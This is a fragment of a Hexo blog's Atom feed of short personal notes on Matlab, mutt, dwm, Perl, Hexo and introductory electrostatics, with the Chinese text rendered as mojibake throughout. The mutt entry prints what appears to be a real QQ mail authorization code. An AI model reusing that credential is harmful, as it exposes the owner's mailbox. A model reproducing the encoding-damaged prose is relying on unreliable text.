title="ç¦»æ•£æ•°æ®ç»˜å›¾"></a>ç¦»æ•£æ•°æ®ç»˜å›¾</h2><p>ä½¿ç”¨ <code>plot(x,y)</code> ç»˜åˆ¶ä¸€äº›ç¦»æ•£æ•°æ®å›¾å¹¶ç”¨çº¿è¿æ¥èµ·æ¥.</p><p>å…ˆåˆ›å»ºæ•°ç»„, ç”±äºä¸æ˜¯å¯¹è¿ç»­å‡½æ•°è¿›è¡Œå»ºæ¨¡, å› æ­¤æ²¡æœ‰å¿…è¦æŒ‡å®šå¢é‡.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">x</span> = [<span class="hljs-number">1</span>:<span class="hljs-number">5</span>]<span class="hljs-comment">;</span><br><span class="hljs-attr">y</span> = [<span class="hljs-number">50</span>, <span class="hljs-number">98</span>, <span class="hljs-number">75</span>, <span class="hljs-number">80</span>, <span class="hljs-number">98</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ç”¨æ¡å½¢å›¾ç»˜åˆ¶, ä½¿ç”¨ <code>bar(x,y)</code> å‡½æ•°.</p><p>ç»˜åˆ¶é’ˆå¤´å›¾, ä½¿ç”¨ <code>stem</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥çœ‹-qq-é‚®ç®±çš„-IMAP-åœ°å€</title>
    <link href="/2022/10/15/%E6%9F%A5%E7%9C%8B-qq-%E9%82%AE%E7%AE%B1%E7%9A%84-IMAP-%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/10/15/%E6%9F%A5%E7%9C%8B-qq-%E9%82%AE%E7%AE%B1%E7%9A%84-IMAP-%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>å¦‚ <a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331">è¿™ä¸ªç•Œé¢</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>mutt-çš„ä½¿ç”¨</title>
    <link href="/2022/10/15/mutt-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/15/mutt-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>mutt æ˜¯ä¸€ä¸ªæ¡†æ¶, è€Œä¸æ˜¯å®ç°æŸä¸ªåŠŸèƒ½çš„ç¨‹åº.</p><h1 id="ArchWiki-ç›¸å…³å†…å®¹"><a href="#ArchWiki-ç›¸å…³å†…å®¹" class="headerlink" title="ArchWiki ç›¸å…³å†…å®¹"></a>ArchWiki ç›¸å…³å†…å®¹</h1><p><a href="https://wiki.archlinux.org/title/Mutt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">ArchWiki</a></p><h1 id="å‚è€ƒ-B-ç«™"><a href="#å‚è€ƒ-B-ç«™" class="headerlink" title="å‚è€ƒ B ç«™"></a>å‚è€ƒ B ç«™</h1><p><a href="https://b23.tv/7dbzabo">å‚è€ƒ</a></p><h2 id="ç™»å½•-qq-é‚®ç®±"><a href="#ç™»å½•-qq-é‚®ç®±" class="headerlink" title="ç™»å½• qq é‚®ç®±"></a>ç™»å½• qq é‚®ç®±</h2><p>å¹¶ä¸æ˜¯ç”¨ qq å¯†ç , è€Œæ˜¯ä¸€ä¸ªæˆæƒç .</p><p>å¦‚: <code>lkgajjkbkuzfddca</code></p><p><a href="https://support.huaweicloud.com/usermanual-welink/welink_appuse_13_1.html">è·å–æˆæƒç </a></p><h2 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h2><p>åœ¨ <code>~/.config/mutt</code></p><h2 id="åœ¨-neomutt-ç•Œé¢è·³è½¬"><a href="#åœ¨-neomutt-ç•Œé¢è·³è½¬" class="headerlink" title="åœ¨ neomutt ç•Œé¢è·³è½¬"></a>åœ¨ neomutt ç•Œé¢è·³è½¬</h2><p>æŒ‰ hjkl åœ¨ å³è¾¹æ è·³è½¬.</p><p>æŒ‰ <code>&lt;C-j&gt;</code> æˆ– <code>&lt;C-k&gt;</code> åœ¨å·¦è¾¹æ è·³è½¬.</p><p><code>&lt;C-o&gt;</code> è¿›å…¥.</p><p><code>&lt;Space&gt;</code> æŸ¥çœ‹é‚®ä»¶.</p><p><code>l</code> æ˜¯æŸ¥çœ‹é™„ä»¶.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dwm-æ›´æ¢çŠ¶æ€æ </title>
    <link href="/2022/10/15/dwm-%E6%9B%B4%E6%8D%A2%E7%8A%B6%E6%80%81%E6%A0%8F/"/>
    <url>/2022/10/15/dwm-%E6%9B%B4%E6%8D%A2%E7%8A%B6%E6%80%81%E6%A0%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/XosQaxz">å‚è€ƒ</a></p><p>éœ€è¦åˆ©ç”¨ dwmblocks è¿™ä¸ªæ’ä»¶. å¯ä»¥ <a href="https://github.com/LukeSmithxyz/dwmblocks">åœ¨ Github ä¸Šè·å–</a></p><p>ä¸»è¦åˆ©ç”¨ dwm å‘é€ç»™ dwmblocks çš„ä¿¡å·æ¥æ‰§è¡Œå‘½ä»¤, ä¿¡å·åº”è¯¥å¯ä»¥æ˜¯æ•´æ•°ä¹Ÿå¯ä»¥ä¸ºå­—ç¬¦. å‘é€çš„ä¿¡å·ä¼¼ä¹ä¿å­˜åœ¨ <code>$BLOCK_BUTTON</code> è¿™ä¸ªå˜é‡ä¸­.</p><h1 id="æ˜¾ç¤ºè¡¨æƒ…åŒ…"><a href="#æ˜¾ç¤ºè¡¨æƒ…åŒ…" class="headerlink" title="æ˜¾ç¤ºè¡¨æƒ…åŒ…"></a>æ˜¾ç¤ºè¡¨æƒ…åŒ…</h1><p><a href="https://partage.les-miquelots.net/engver/blog/how-to-have-colored-emojis-in-dmenu-st-dwm-and-slstatus-on-archlinux.html">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ºä»€ä¹ˆ-Alt-ç­‰é”®è¢«å«åš-modkey</title>
    <link href="/2022/10/15/%E4%B8%BA%E4%BB%80%E4%B9%88-Alt-%E7%AD%89%E9%94%AE%E8%A2%AB%E5%8F%AB%E5%81%9A-modkey/"/>
    <url>/2022/10/15/%E4%B8%BA%E4%BB%80%E4%B9%88-Alt-%E7%AD%89%E9%94%AE%E8%A2%AB%E5%8F%AB%E5%81%9A-modkey/</url>
    
    <content type="html"><![CDATA[<p>modkey æ˜¯ modifier key çš„æ„æ€, ç”¨æ¥ä¿®é¥°, ä½ å•å•æŒ‰ä¸‹ <code>Alt</code>, <code>Control</code> å¹¶ä¸ä¼šæœ‰æ•ˆæœ, éœ€è¦é…åˆå…¶ä»–é”®, ç”¨äºä¿®é¥°å…¶ä»–é”®çš„æ—¶å€™æ‰æœ‰ç”¨.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dwm-é”®ä½ç»‘å®š</title>
    <link href="/2022/10/15/dwm-%E9%94%AE%E4%BD%8D%E7%BB%91%E5%AE%9A/"/>
    <url>/2022/10/15/dwm-%E9%94%AE%E4%BD%8D%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>ç›´æ¥å°†æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤æ”¾åœ¨ä¸€ä¸ªè„šæœ¬é‡Œé¢, ç„¶åå†æ·»åŠ åˆ° <code>config.h</code> ä¸­, å¦‚:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *test[] = &#123;<span class="hljs-string">&quot;/home/jie/scripts/perl/next_wallpaper.pl&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> Key keys[] = &#123;<br>    &#123; MODKEY|ShiftMask,         XK_t,   spawn,      &#123;.v = test&#125;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚è¿™æ ·å†™å°±è¡Œ.</p><h1 id="ä½¿ç”¨-Alt"><a href="#ä½¿ç”¨-Alt" class="headerlink" title="ä½¿ç”¨ Alt"></a>ä½¿ç”¨ Alt</h1><p>ä½¿ç”¨ <code>Mod1Mask</code> å³å¯. å¦‚ <code>MODKEY|ShiftMask</code></p><h1 id="æ·»åŠ äº†è°ƒèŠ‚äº®åº¦å’ŒéŸ³é‡"><a href="#æ·»åŠ äº†è°ƒèŠ‚äº®åº¦å’ŒéŸ³é‡" class="headerlink" title="æ·»åŠ äº†è°ƒèŠ‚äº®åº¦å’ŒéŸ³é‡"></a>æ·»åŠ äº†è°ƒèŠ‚äº®åº¦å’ŒéŸ³é‡</h1><p>éœ€è¦é…åˆ <code>Fn</code> ä½¿ç”¨.</p><h1 id="spawnå‡½æ•°-æºä»£ç è§£æ"><a href="#spawnå‡½æ•°-æºä»£ç è§£æ" class="headerlink" title="spawnå‡½æ•° æºä»£ç è§£æ"></a>spawnå‡½æ•° æºä»£ç è§£æ</h1><p>å£°æ˜:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">spawn</span><span class="hljs-params">(<span class="hljs-type">const</span> Arg *arg)</span>;<br></code></pre></td></tr></table></figure><p>æºä»£ç å†…å®¹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">spawn</span><span class="hljs-params">(<span class="hljs-type">const</span> Arg *arg)</span><br>&#123;<br><span class="hljs-keyword">if</span> (arg-&gt;v == dmenucmd)<br>dmenumon[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;0&#x27;</span> + selmon-&gt;num;<br>selmon-&gt;tagset[selmon-&gt;seltags] &amp;= ~scratchtag;<br><span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (dpy)<br>close(ConnectionNumber(dpy));<br>setsid();<br>execvp(((<span class="hljs-type">char</span> **)arg-&gt;v)[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span> **)arg-&gt;v);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dwm: execvp %s&quot;</span>, ((<span class="hljs-type">char</span> **)arg-&gt;v)[<span class="hljs-number">0</span>]);<br>perror(<span class="hljs-string">&quot; failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-vim-ä¸­çš„-modkey</title>
    <link href="/2022/10/14/%E5%85%B3%E4%BA%8E-vim-%E4%B8%AD%E7%9A%84-modkey/"/>
    <url>/2022/10/14/%E5%85%B3%E4%BA%8E-vim-%E4%B8%AD%E7%9A%84-modkey/</url>
    
    <content type="html"><![CDATA[<p>åœ¨é”®ä½æ˜ å°„ä¸­ <code>&lt;M-c&gt;</code> è¡¨ç¤º modkey + c, è¿™é‡Œçš„ modkey æ˜¯ç”µè„‘ä¸Šçš„ Mod1 ä¹Ÿå°±æ˜¯ Alt.</p><p>å¦‚ä½•ä¿®æ”¹æš‚æ—¶ä¸æ¸…æ¥š.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-å…³äº-Keyboard-input-éƒ¨åˆ†</title>
    <link href="/2022/10/14/ArchWiki-%E5%85%B3%E4%BA%8E-Keyboard-input-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/14/ArchWiki-%E5%85%B3%E4%BA%8E-Keyboard-input-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-dwm-æ›´æ¢-modkey</title>
    <link href="/2022/10/14/%E5%85%B3%E4%BA%8E-dwm-%E6%9B%B4%E6%8D%A2-modkey/"/>
    <url>/2022/10/14/%E5%85%B3%E4%BA%8E-dwm-%E6%9B%B4%E6%8D%A2-modkey/</url>
    
    <content type="html"><![CDATA[<p><a href="https://dwm.suckless.org/customisation/windows_key/">å®˜æ–¹è§£å†³æ–¹æ¡ˆ</a><br>dwm é»˜è®¤ä½¿ç”¨ç³»ç»Ÿä¸Šçš„ Mod1 (ä¸€èˆ¬æ˜ å°„åˆ° Alt é”®).</p><p>å°† <code>Mod1Mask</code> æ”¹ä¸º <code>Mod4Mask</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/14/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8A%E7%9A%84-modkey-%E5%8F%8A-%E4%B8%8E-modkey-%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E4%B8%AA/"/>
    <url>/2022/10/14/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8A%E7%9A%84-modkey-%E5%8F%8A-%E4%B8%8E-modkey-%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E4%B8%AA/</url>
    
    <content type="html"><![CDATA[<hr><p>title: æŸ¥çœ‹-Linux-ä¸Šçš„-modkey-åŠ-ä¸-modkey-ç›¸å…³å†…å®¹<br>date: 2022-10-14 11:26:19<br>tags:<br>categories: Linux<br>â€“</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-perl-çš„é’»çŸ³æ“ä½œç¬¦</title>
    <link href="/2022/10/14/%E5%85%B3%E4%BA%8E-perl-%E7%9A%84%E9%92%BB%E7%9F%B3%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
    <url>/2022/10/14/%E5%85%B3%E4%BA%8E-perl-%E7%9A%84%E9%92%BB%E7%9F%B3%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>å…¶è·å–çš„å†…å®¹å–å†³ä¸ä¸Šä¸‹æ–‡.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºè‰²ç¯ç”µé˜»çš„è¯»æ³•</title>
    <link href="/2022/10/13/%E5%85%B3%E4%BA%8E%E8%89%B2%E7%8E%AF%E7%94%B5%E9%98%BB%E7%9A%84%E8%AF%BB%E6%B3%95/"/>
    <url>/2022/10/13/%E5%85%B3%E4%BA%8E%E8%89%B2%E7%8E%AF%E7%94%B5%E9%98%BB%E7%9A%84%E8%AF%BB%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/40475101">å‚è€ƒ</a><br><img src="https://pic1.zhimg.com/v2-7c28189184bea66c61df0f8d95baf384_r.jpg"></p><h1 id="äº”ç¯ç”µé˜»"><a href="#äº”ç¯ç”µé˜»" class="headerlink" title="äº”ç¯ç”µé˜»"></a>äº”ç¯ç”µé˜»</h1><p>ä¸æŸä¸ªæ¡å¸¦ç›¸è·æœ€è¿œçš„ä¸ºæœ€åä¸€ä½, ä¸ºè¯¯å·®.</p><p>ä»å¦ä¸€ç«¯å¼€å§‹è¯», å‰ä¸‰ä½ä¸ºæ•°å€¼, ç¬¬å››ä½ä¸ºç§‘å­¦è®¡æ•°æ³• (å³ $10^x$).</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-é…ç½®è¯„è®ºåŒº</title>
    <link href="/2022/10/12/Hexo-%E9%85%8D%E7%BD%AE%E8%AF%84%E8%AE%BA%E5%8C%BA/"/>
    <url>/2022/10/12/Hexo-%E9%85%8D%E7%BD%AE%E8%AF%84%E8%AE%BA%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://liaoyq.club/2020/04/03/hexo-fluid%E6%B7%BB%E5%8A%A0utterances%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD/">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim-ä¸­è°ƒæ•´ä»£ç æ ¼å¼</title>
    <link href="/2022/10/11/vim-%E4%B8%AD%E8%B0%83%E6%95%B4%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F/"/>
    <url>/2022/10/11/vim-%E4%B8%AD%E8%B0%83%E6%95%B4%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>=</code> å‘½ä»¤, å…·ä½“æŸ¥çœ‹ <code>:h =</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDA-çš„ä½¿ç”¨</title>
    <link href="/2022/10/10/IDA-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/10/IDA-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Re</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>x64dbg-çš„ä½¿ç”¨</title>
    <link href="/2022/10/10/x64dbg-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/10/x64dbg-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Re</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-convert-å‘½ä»¤</title>
    <link href="/2022/10/09/Linux-convert-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/10/09/Linux-convert-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u014743238/article/details/104636812">å‚è€ƒ</a><br>æ—‹è½¬ç”¨ <code>-rotate</code> å‚æ•°:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ convert -rotate 90 input.jpg output.jpg<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-å†™-LaTeX-å¤šè¡Œå…¬å¼æ— æ³•æ­£ç¡®æ¢è¡Œ</title>
    <link href="/2022/10/09/Hexo-%E5%86%99-LaTeX-%E5%A4%9A%E8%A1%8C%E5%85%AC%E5%BC%8F%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E6%8D%A2%E8%A1%8C/"/>
    <url>/2022/10/09/Hexo-%E5%86%99-LaTeX-%E5%A4%9A%E8%A1%8C%E5%85%AC%E5%BC%8F%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E6%8D%A2%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p>æš‚æ—¶æ— æ³•è§£å†³.</p><p>å¯ä»¥ç”¨å¤šå†™å‡ æ®µæš‚æ—¶å°†å°±ç”¨.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-å¼€å¯æ•°å­¦å…¬å¼</title>
    <link href="/2022/10/09/Hexo-%E5%BC%80%E5%90%AF%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/"/>
    <url>/2022/10/09/Hexo-%E5%BC%80%E5%90%AF%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.fluid-dev.com/docs/guide/#latex-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">fluid å®˜ç½‘</a><br>ä¿®æ”¹ <code>_config.fluid.yml</code> é…ç½®æ–‡ä»¶, æ‰¾åˆ° <code>post:</code>:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">math:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">specific:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">engine:</span> <span class="hljs-string">mathjax</span><br><br></code></pre></td></tr></table></figure><p>è¿˜è¦åœ¨æ¯ç¯‡æ–‡ç« çš„:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>éƒ¨åˆ†æ·»åŠ  <code>math: ture</code>, å¦‚:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">math:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-error-Can-not-locate-module-in-@INC</title>
    <link href="/2022/10/08/Perl-error:%20Can&#39;t-locate-module-in-@INC/"/>
    <url>/2022/10/08/Perl-error:%20Can&#39;t-locate-module-in-@INC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://alvinalexander.com/blog/post/perl/perl-error-cant-locate-module-in-inc/">å‚è€ƒ1</a><br>è¿™ä¸ªæŠ¥é”™æ„å‘³ç€è¿™ä¸ªæ¨¡å—ä¸åœ¨ Perlâ€™s include path (ä¹Ÿå°±æ˜¯ <code>@INC</code> è¿™ä¸ªå˜é‡).</p><p><code>@INC</code> è¿™ä¸ª INC åº”è¯¥å¯ä»¥çœ‹ä½œ INClude.</p><p>æŸ¥çœ‹ <code>@INC</code> è¿™ä¸ªæ•°ç»„çš„å€¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -e <span class="hljs-string">&#x27;print join(&quot;\n&quot;, @INC);&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://alvinalexander.com/blog/post/perl/checking-testing-perl-module-in-inc-include-path/">å‚è€ƒ2</a></h1><p>æµ‹è¯•ä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å®‰è£…äº† perl çš„æŸä¸ªæ¨¡å—:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -e <span class="hljs-string">&#x27;use Error;&#x27;</span><br></code></pre></td></tr></table></figure><p><code>-e</code> å‚æ•°åº”è¯¥æ˜¯ execute. ç”¨äºåœ¨å‘½ä»¤è¡Œæ‰§è¡Œ perl ä»£ç , è¿™é‡Œçš„åŸç†å°±æ˜¯, å¦‚æœå­˜åœ¨è¿™ä¸ªæ¨¡å—, ä½ ç”¨ <code>use</code> æŒ‡ä»¤å°±ä¸ä¼šæŠ¥é”™.</p><p>å¦‚æœæŠ¥é”™ä¹Ÿä¸æ˜¯è¯´è¿™ä¸ªæ¨¡å—å®‰è£…, è€Œæ˜¯æ²¡æœ‰åœ¨ <code>@INC</code> include path ä¸­.</p><h2 id="ä¿®æ”¹-INC-include-path"><a href="#ä¿®æ”¹-INC-include-path" class="headerlink" title="ä¿®æ”¹ @INC include path"></a><a href="https://alvinalexander.com/perl/edu/articles/pl010015/">ä¿®æ”¹ <code>@INC</code> include path</a></h2><p>å¦‚æœæ˜¯ root ç”¨æˆ·, perl çš„æ¨¡å—ä¼šè¢«å®‰è£…åˆ°é»˜è®¤çš„ä½ç½®.</p><p>æ·»åŠ  <code>@INC</code> çš„ search directory:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> lib <span class="hljs-string">&#x27;/home/george/modules&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¤§ç‰©IIä¸ŠåŠæœŸ</title>
    <link href="/2022/10/08/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F/"/>
    <url>/2022/10/08/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-19-Electric-Charge-and-Electric-Field"><a href="#Chapter-19-Electric-Charge-and-Electric-Field" class="headerlink" title="Chapter 19 Electric Charge and Electric Field"></a>Chapter 19 Electric Charge and Electric Field</h1><p>ä»»ä½•æ´»åŠ¨äº§ç”Ÿçš„å‡€ç”µè·é‡ä¸ºé›¶. The net amount of electric charge produced in any process is zero.</p><p>ç”µè·ä»ä¸€ä¸ªç‰©ä½“è½¬ç§»åˆ°å¦ä¸€ä¸ªç‰©ä½“.</p><h2 id="19-2-Electric-Charge-in-the-Atom"><a href="#19-2-Electric-Charge-in-the-Atom" class="headerlink" title="19.2 Electric Charge in the Atom"></a>19.2 Electric Charge in the Atom</h2><p>ä¸ºä»€ä¹ˆæ‘©æ“¦åçš„ç‰©ä½“åœ¨ä¸€æ®µæ—¶é—´ååˆæ¢å¤åˆ°äº†ç”µä¸­æ€§?</p><p>ç”±äºæ°´åˆ†å­çš„ææ€§, ä¹Ÿå°±æ˜¯è¯´å°½ç®¡æ°´åˆ†å­æ˜¯å‘ˆä¸­æ€§, ä½†æ˜¯å…¶å†…éƒ¨çš„ç”µè·åˆ†å¸ƒä¸å‡è¡¡, å› æ­¤ç‰©ä½“ä¸Šçš„ç”µè·ä¼šè¢«æ°´åˆ†å­ä¸Šåæ­£ç”µæ€§çš„ä¸€ç«¯æ‰€å¸å¼•, å°±ä¼š leak off into air.</p><h2 id="19-3-Insulators-and-Conductors"><a href="#19-3-Insulators-and-Conductors" class="headerlink" title="19.3 Insulators and Conductors"></a>19.3 Insulators and Conductors</h2><p>Insulating å°±æ˜¯ â€˜ç»ç¼˜çš„â€™ çš„æ„æ€.</p><p>ç»ç¼˜ä½“å¹¶ä¸æ˜¯å®Œå…¨ä¸å¯¼ç”µ.</p><p>Insulating material ä¸­çš„ç”µå­ bound very tightly to th nuclei.</p><h2 id="19-5-Coulombâ€™s-Law"><a href="#19-5-Coulombâ€™s-Law" class="headerlink" title="19.5 Coulombâ€™s Law"></a>19.5 Coulombâ€™s Law</h2><p>å…¬å¼ä¸º:</p><p>$F &#x3D; k \frac{Q_1Q_2}{r^2}$</p><p>k æ˜¯ä¸€ä¸ªå¸¸é‡. $k &#x3D; 8.988 \times 10^9 N \cdot m^2&#x2F;C^2$</p><p>ä¸€ä¸ªç”µå­ electron çš„ç”µè·é‡ä¸º:</p><p>$e &#x3D; 1.602 \times 10^{-19}C$</p><p>e è¢«å®šä¹‰ä¸ºä¸€ä¸ªæ­£å€¼. å› æ­¤ electron çš„ç”µè·é‡å®é™…ä¸º -e.</p><p>ä»»ä½•ç‰©ä½“çš„å‡€ç”µè·éƒ½å¿…é¡»æ˜¯ e çš„æ•´æ•°å€å¦‚: e, 2e, 3e â€¦</p><p>k å¸¸ç”¨å¦ä¸€ä¸ªå¸¸é‡ $\epsilon_0$ æ›¿æ¢:<br>$$<br>k &#x3D; \frac{1}{4 \pi \epsilon_0}, \epsilon_0 &#x3D; 8.85 \times 10^{-12}C^2&#x2F;N \cdot m^2<br>$$<br>å› æ­¤, Coulombâ€™s Law åˆè¢«å†™æˆ:<br>$$<br>F &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q_1 Q_2}{r^2}<br>$$</p><h2 id="19-6-The-Electric-Field"><a href="#19-6-The-Electric-Field" class="headerlink" title="19.6 The Electric Field"></a>19.6 The Electric Field</h2><p>ç”µåœºçš„å¤§å°å’Œ test charge çš„ç”µè·é‡æ— å…³, å› ä¸ºè¿™é‡Œçš„ test charge å–çš„ç”µè·é‡æ˜¯æå°çš„, 